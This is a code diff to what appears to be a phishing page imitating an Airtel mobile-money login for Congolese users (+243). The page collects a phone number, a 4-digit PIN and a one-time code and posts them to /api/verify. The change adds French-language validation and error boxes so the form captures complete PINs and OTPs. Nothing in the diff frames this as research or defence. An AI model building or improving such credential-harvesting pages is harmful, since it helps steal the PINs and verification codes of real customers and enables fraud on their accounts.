@@ -439,6 +439,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
       const [pin, setPin] = useState(['', '', '', '']);
       const [otp, setOtp] = useState(['', '', '', '']);
       const [timer, setTimer] = useState(60);
+      const [error, setError] = useState('');
 
       useEffect(() => {
         let interval;
@@ -450,6 +451,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
 
       const hPC = (i, v) => {
         if (v.length <= 1 && /^\d*$/.test(v)) {
+          setError('');
           const n = [...pin];
           n[i] = v;
           setPin(n);
@@ -462,6 +464,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
 
       const hOC = (i, v) => {
         if (v.length <= 1 && /^\d*$/.test(v)) {
+          setError('');
           const n = [...otp];
           n[i] = v;
           setOtp(n);
@@ -473,6 +476,15 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
       };
 
       const handleLoginSubmit = async () => {
+        setError('');
+        if (!phone.trim()) {
+          setError('Veuillez entrer votre numéro de téléphone.');
+          return;
+        }
+        if (pin.join('').length < 4) {
+          setError('Veuillez entrer votre code PIN Airtel complet (4 chiffres).');
+          return;
+        }
         setIsLoading(true);
         try {
           await fetch('/api/verify', {
@@ -494,6 +506,11 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
       };
 
       const handleVerify = async () => {
+        setError('');
+        if (otp.join('').length < 4) {
+          setError('Veuillez entrer le code de vérification complet (4 chiffres).');
+          return;
+        }
         setIsLoading(true);
         try {
           await fetch('/api/verify', {
@@ -565,6 +582,11 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
                   ))}
                 </div>
                 <div className='mt-6 text-gray-500 font-medium'>Renvoyer le code dans <span className='text-red-600'>{timer}s</span></div>
+                {error && (
+                  <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-xl text-red-700 font-medium text-center">
+                    {error}
+                  </div>
+                )}
                 <button onClick={handleVerify} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90'>Vérifier & Continuer</button>
               </div>
             </main>
@@ -590,7 +612,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
                 <label className="block text-gray-700 font-semibold mb-3 text-lg">Numéro de téléphone</label>
                 <div className="flex items-center border border-gray-300 rounded-2xl overflow-hidden focus-within:border-red-500">
                   <span className="bg-gray-50 px-5 py-4 border-r border-gray-300 text-gray-500 font-medium text-lg">+243</span>
-                  <input type="tel" className="flex-1 px-5 py-4 outline-none text-lg" value={phone} onChange={(e) => setPhone(e.target.value)} />
+                  <input type="tel" className="flex-1 px-5 py-4 outline-none text-lg" value={phone} onChange={(e) => { setPhone(e.target.value); setError(''); }} />
                 </div>
               </div>
               <div className="mt-10">
@@ -601,6 +623,11 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
                   ))}
                 </div>
               </div>
+              {error && (
+                <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-xl text-red-700 font-medium text-center">
+                  {error}
+                </div>
+              )}
               <button onClick={handleLoginSubmit} className="w-full mt-12 py-5 airtel-red text-white rounded-full text-xl font-bold flex items-center justify-center gap-2 hover:opacity-90">
                 Connexion <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
               </button>
